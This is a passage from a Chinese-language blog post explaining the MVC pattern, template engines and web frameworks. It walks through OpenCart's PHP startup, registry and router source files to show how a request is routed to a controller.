这样的用户请求数组<br>（2）创建模型，并决定一个模型对象的生命周期<br>（3）不应该出现SQL语句，数据库请求应该放到Model中<br>（4）不应该出现Html代码，应该将其放入View中</p></blockquote><h1 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档python与php常用模板引擎举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">Smarty,Twig,Haml,Liquid,Mustache,Plates</span><br><span class="line">//python</span><br><span class="line">Jinja2,Mako,pyTenjin,PyJade,cheetah,django</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h1 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a><a href="https://zh.wikipedia.org/zh-sg/Web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6" target="_blank" rel="noopener">web框架</a></h1><p>web服务器封装的是socket，web框架封装的是response和request。web服务器（web server）的主要作用是，接收客户端请求，而web框架（webframework）则是处理web服务器收到的请求，并生成HTML内容，将生成的内容传递给web服务器，再由web服务器返回给客户端。所以，web框架是面像开发的，而web服务器是面向连接的。现如今，类似于php，java, python这样的语言都有很多集成的框架来加速开发和使得代码更方便维护等。而在现在比较出名的框架，诸如struts,spring,django,thinkphp等都是采用MVC的设计理念，使得代码更健壮。</p><h1 id="opencert为例深入理解MVC开发模式"><a href="#opencert为例深入理解MVC开发模式" class="headerlink" title="opencert为例深入理解MVC开发模式"></a>opencert为例深入理解MVC开发模式</h1><p>OpenCart 是世界著名的开源电子商务系统，系统开发语言为 PHP。早期由英国人 Daniel Kerr 个人开发，目前项目托管在 GitHub。该项目采用 MVCL 架构、代码清晰规范、安装方便，使得开发者可以轻易上手进行定制开发。<a href="https://baike.baidu.com/item/opencart" target="_blank" rel="noopener">详情参看百度百科</a></p><h3 id="简化的目录结构（只专注于学习MVC需要了解到的目录结构）"><a href="#简化的目录结构（只专注于学习MVC需要了解到的目录结构）" class="headerlink" title="简化的目录结构（只专注于学习MVC需要了解到的目录结构）"></a>简化的目录结构（只专注于学习MVC需要了解到的目录结构）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---upload/#核心代码文件夹</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">------index.php #web应用入口，检测安装以及安装完成的MVC入口指向startup.php</span><br><span class="line">------image/    #存放构建网站所需要的图片</span><br><span class="line">------install/  #安装目录，采用MVC的布局</span><br><span class="line">------admin/    #管理后台目录，采用MVC布局</span><br><span class="line">------catalog/  #网站应用业务目录，采用MVC布局</span><br><span class="line">------system/   #MVC的架构底层实现</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">        ----engine/#MVC的底层引擎实现</span><br><span class="line">        |    |</span><br><span class="line">        |    |</span><br><span class="line">        |     -----------action.php     #属于router.php的子类，主要用来进行url与内部controller的路由</span><br><span class="line">        |     -----------controller.php #controller的超类</span><br><span class="line">        |     -----------loader.php     #对象装载类</span><br><span class="line">        |     -----------model.php      #model超类</span><br><span class="line">        |     -----------router.php     #略</span><br><span class="line">        |     ......</span><br><span class="line">        ----startup.php   #MVC文件入口</span><br><span class="line">        ----framework.php #框架注册或者说是register变量的封装</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><h3 id="一次完整的请求过程"><a href="#一次完整的请求过程" class="headerlink" title="一次完整的请求过程"></a>一次完整的请求过程</h3><p>下面的例子中，将会对admin管理后台下的customer管理业务进行分析。那么业务最直接的MVC架构文件是是admin下<code>/controller/customer/</code>,<code>/view/customer/</code>,以及<code>/model/customer</code>。我们可以看到在实际的管理界面访问这个网站的界面如图所示:</p><p><img src="/myimages/MVC/customer.jpg" alt="image"></p><p>注意到这个网站的URL<code>http://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr</code></p><p>根据网站的目录显示我们先跟进到<code>/upload/admin/index.php</code>这是管理后台的首页，其实在<code>upload/</code>文件下有也有一个index.php是默认对外提供服务的首页，其内容和现在我们看到的基本一样，只不过在用户标识上有细微的差别。</p><p><img src="/myimages/MVC/customer_index.jpg" alt="image"></p><p>在这个index界面是对配置文件的加载和安装的检查，然后include<code>upload/system/startup.php</code>,我们看下startup.php的具体内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Error Reporting</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="comment">// Check Version</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Windows IIS Compatibility</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Check if SSL</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Modification Override</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Helper</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">($application_config)</span> </span>&#123;</span><br><span class="line"><span class="keyword">require_once</span>(DIR_SYSTEM . <span class="string">'framework.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以在源文件里面看到，startup.php首先是对php版本检查，时区检查，平台检查，是否开启ssl，一些引擎，插件等的装载（直观的说是include）,然后就是include<code>upload/system/framework.php</code>。这个文件其实是注册了一个registry对象，这个对象是后面传递给controller，modle的第一个参数，里面封装了一些底层框架必须的类操作，而这些类都是继承来自<code>engine/</code>下定义的类，或其他通过startup.php <code>include</code>文件定义的类。所以说这个源文件相对重要，现在把<code>framework.php</code>全部代码展现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Registry</span></span><br><span class="line">$registry = <span class="keyword">new</span> Registry();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Config</span></span><br><span class="line">$config = <span class="keyword">new</span> Config();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the default config</span></span><br><span class="line">$config-&gt;load(<span class="string">'default'</span>);</span><br><span class="line">$config-&gt;load($application_config);</span><br><span class="line">$registry-&gt;set(<span class="string">'config'</span>, $config);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Log</span></span><br><span class="line">$log = <span class="keyword">new</span> Log($config-&gt;get(<span class="string">'error_filename'</span>));</span><br><span class="line">$registry-&gt;set(<span class="string">'log'</span>, $log);</span><br><span class="line"></span><br><span class="line">date_default_timezone_set($config-&gt;get(<span class="string">'date_timezone'</span>));</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span><span class="params">($code, $message, $file, $line)</span> <span class="title">use</span><span class="params">($log, $config)</span> </span>&#123;</span><br><span class="line"><span class="comment">// error suppressed with @</span></span><br><span class="line"><span class="keyword">if</span> (error_reporting() === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($code) &#123;</span><br><span class="line"><span class="keyword">case</span> E_NOTICE:</span><br><span class="line"><span class="keyword">case</span> E_USER_NOTICE:</span><br><span class="line">$error = <span class="string">'Notice'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> E_WARNING:</span><br><span class="line"><span class="keyword">case</span> E_USER_WARNING:</span><br><span class="line">$error = <span class="string">'Warning'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> E_ERROR:</span><br><span class="line"><span class="keyword">case</span> E_USER_ERROR:</span><br><span class="line">$error = <span class="string">'Fatal Error'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$error = <span class="string">'Unknown'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;get(<span class="string">'error_display'</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;b&gt;'</span> . $error . <span class="string">'&lt;/b&gt;: '</span> . $message . <span class="string">' in &lt;b&gt;'</span> . $file . <span class="string">'&lt;/b&gt; on line &lt;b&gt;'</span> . $line . <span class="string">'&lt;/b&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;get(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">$log-&gt;write(<span class="string">'PHP '</span> . $error . <span class="string">':  '</span> . $message . <span class="string">' in '</span> . $file . <span class="string">' on line '</span> . $line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Event</span></span><br><span class="line">$event = <span class="keyword">new</span> Event($registry);</span><br><span class="line">$registry-&gt;set(<span class="string">'event'</span>, $event);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Event Register</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'action_event'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'action_event'</span>) <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($value <span class="keyword">as</span> $priority =&gt; $action) &#123;</span><br><span class="line">$event-&gt;register($key, <span class="keyword">new</span> Action($action), $priority);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Loader</span></span><br><span class="line">$loader = <span class="keyword">new</span> Loader($registry);</span><br><span class="line">$registry-&gt;set(<span class="string">'load'</span>, $loader);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Request</span></span><br><span class="line">$registry-&gt;set(<span class="string">'request'</span>, <span class="keyword">new</span> Request());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Response</span></span><br><span class="line">$response = <span class="keyword">new</span> Response();</span><br><span class="line">$response-&gt;addHeader(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$response-&gt;setCompression($config-&gt;get(<span class="string">'config_compression'</span>));</span><br><span class="line">$registry-&gt;set(<span class="string">'response'</span>, $response);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Database</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;get(<span class="string">'db_autostart'</span>)) &#123;</span><br><span class="line">$registry-&gt;set(<span class="string">'db'</span>, <span class="keyword">new</span> DB($config-&gt;get(<span class="string">'db_engine'</span>), $config-&gt;get(<span class="string">'db_hostname'</span>), $config-&gt;get(<span class="string">'db_username'</span>), $config-&gt;get(<span class="string">'db_password'</span>), $config-&gt;get(<span class="string">'db_database'</span>), $config-&gt;get(<span class="string">'db_port'</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session</span></span><br><span class="line">$session = <span class="keyword">new</span> Session($config-&gt;get(<span class="string">'session_engine'</span>), $registry);</span><br><span class="line">$registry-&gt;set(<span class="string">'session'</span>, $session);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;get(<span class="string">'session_autostart'</span>)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">We are adding the session cookie outside of the session class as I believe</span></span><br><span class="line"><span class="comment">PHP messed up in a big way handling sessions. Why in the hell is it so hard to</span></span><br><span class="line"><span class="comment">have more than one concurrent session using cookies!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Is it not better to have multiple cookies when accessing parts of the system</span></span><br><span class="line"><span class="comment">that requires different cookie sessions for security reasons.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Also cookies can be accessed via the URL parameters. So why force only one cookie</span></span><br><span class="line"><span class="comment">for all sessions!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[$config-&gt;get(<span class="string">'session_name'</span>)])) &#123;</span><br><span class="line">$session_id = $_COOKIE[$config-&gt;get(<span class="string">'session_name'</span>)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$session_id = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;start($session_id);</span><br><span class="line"></span><br><span class="line">setcookie($config-&gt;get(<span class="string">'session_name'</span>), $session-&gt;getId(), (ini_get(<span class="string">'session.cookie_lifetime'</span>) ? (time() + ini_get(<span class="string">'session.cookie_lifetime'</span>)) : <span class="number">0</span>), ini_get(<span class="string">'session.cookie_path'</span>), ini_get(<span class="string">'session.cookie_domain'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cache</span></span><br><span class="line">$registry-&gt;set(<span class="string">'cache'</span>, <span class="keyword">new</span> Cache($config-&gt;get(<span class="string">'cache_engine'</span>), $config-&gt;get(<span class="string">'cache_expire'</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Url</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;get(<span class="string">'url_autostart'</span>)) &#123;</span><br><span class="line">$registry-&gt;set(<span class="string">'url'</span>, <span class="keyword">new</span> Url($config-&gt;get(<span class="string">'site_url'</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Language</span></span><br><span class="line">$language = <span class="keyword">new</span> Language($config-&gt;get(<span class="string">'language_directory'</span>));</span><br><span class="line">$registry-&gt;set(<span class="string">'language'</span>, $language);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Document</span></span><br><span class="line">$registry-&gt;set(<span class="string">'document'</span>, <span class="keyword">new</span> Document());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Config Autoload</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'config_autoload'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'config_autoload'</span>) <span class="keyword">as</span> $value) &#123;</span><br><span class="line">$loader-&gt;config($value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Language Autoload</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'language_autoload'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'language_autoload'</span>) <span class="keyword">as</span> $value) &#123;</span><br><span class="line">$loader-&gt;language($value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Library Autoload</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'library_autoload'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'library_autoload'</span>) <span class="keyword">as</span> $value) &#123;</span><br><span class="line">$loader-&gt;library($value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Model Autoload</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'model_autoload'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'model_autoload'</span>) <span class="keyword">as</span> $value) &#123;</span><br><span class="line">$loader-&gt;model($value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route</span></span><br><span class="line">$route = <span class="keyword">new</span> Router($registry);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pre Actions</span></span><br><span class="line"><span class="keyword">if</span> ($config-&gt;has(<span class="string">'action_pre_action'</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($config-&gt;get(<span class="string">'action_pre_action'</span>) <span class="keyword">as</span> $value) &#123;</span><br><span class="line">$route-&gt;addPreAction(<span class="keyword">new</span> Action($value));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dispatch</span></span><br><span class="line">$route-&gt;dispatch(<span class="keyword">new</span> Action($config-&gt;get(<span class="string">'action_router'</span>)), <span class="keyword">new</span> Action($config-&gt;get(<span class="string">'action_error'</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output</span></span><br><span class="line">$response-&gt;output();</span><br></pre></td></tr></table></figure><p>前面说到这个文件主要实例化了一个register类，而这个类以继承的方式实现了一些底层MVC的架构（这些会慢慢的在后面的分析中得以诠释），Register类封装的是一个在View和Controller中进行数据交换的接口<code>$data</code>(在下面来源于/engine/registry.php代码中，可以在Registery类的定义中看到Registry类实际上是围绕<code>$data</code>变量来进行一些赋值和取值操作)，也可以把Register看成一种数据结构，它在类之间传递数据。在<code>$data</code>这个字典类型中的key表示的是一些变量名称，但是为了方便理解，我们更愿意称之为对象名,因为这些变量存储的数据类型很杂，包括一些底层MVC的超类，如Loader,Config,Event,Language,Route等等，特别是Loader与Route类，Loader类实现了对Model，Language，View，Controller等的实例化，而Route则提供了URL的参数路由规则（这些也会在后面有所涉及）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Registry</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $data = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$key]) ? <span class="keyword">$this</span>-&gt;data[$key] : <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$key]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很好，那么到了这里，我们可以回头看下我们如果访问<code>http://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr</code>中<code>index.php</code>中的相关后台运行原理已经解释得差不多了，那么route参数后的一堆东西，后台是如何处理的呢？这里就需要知道web框架MVC思想中的Route规则。首先来谈下为何需要这个路由，因为MVC中的C是十分重要的，负责处理用户请求，载入Model获取数据，然后通过<code>$data</code>接口交付给View,然后由渲染引擎，在这里是twig进行网页的渲染。而在众多的业务逻辑里面（我们可以在admin/controller目录中看到很多的controller），怎么通过URL来实现对不同业务的特定controller的处理一一对应？这时route规则应运而生。所以现在我们就来看下与route规则紧密相关的两个引擎源文件，<code>system/engine/router.php</code>和<code>system/engine/action.php</code>。首先来看下router.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Router</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $registry;</span><br><span class="line"><span class="keyword">private</span> $pre_action = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">private</span> $error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($registry)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;registry = $registry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addPreAction</span><span class="params">(Action $pre_action)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pre_action[] = $pre_action;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Action $action, Action $error)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;error = $error;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;pre_action <span class="keyword">as</span> $pre_action) &#123;</span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;execute($pre_action);</span><br><span class="line"><span class="keyword">if</span> ($result <span class="keyword">instanceof</span> Action) &#123;</span><br><span class="line">$action = $result;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ($action <span class="keyword">instanceof</span> Action) &#123;</span><br><span class="line">$action = <span class="keyword">$this</span>-&gt;execute($action);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Action $action)</span> </span>&#123;</span><br><span class="line">$result = $action-&gt;execute(<span class="keyword">$this</span>-&gt;registry);</span><br><span class="line"><span class="keyword">if</span> ($result <span class="keyword">instanceof</span> Action) &#123;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ($result <span class="keyword">instanceof</span> <span class="keyword">Exception</span>) &#123;</span><br><span class="line">$action = <span class="keyword">$this</span>-&gt;error;</span><br><span class="line"><span class="keyword">$this</span>-&gt;error = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">return</span> $action;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个文件其实把很多的实现细节放在了action.php,所以我们重点来看action.php,以上的代码作为参考阅读。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $id;</span><br><span class="line"><span class="keyword">private</span> $route;</span><br><span class="line"><span class="keyword">private</span> $method = <span class="string">'index'</span>;</span><br><span 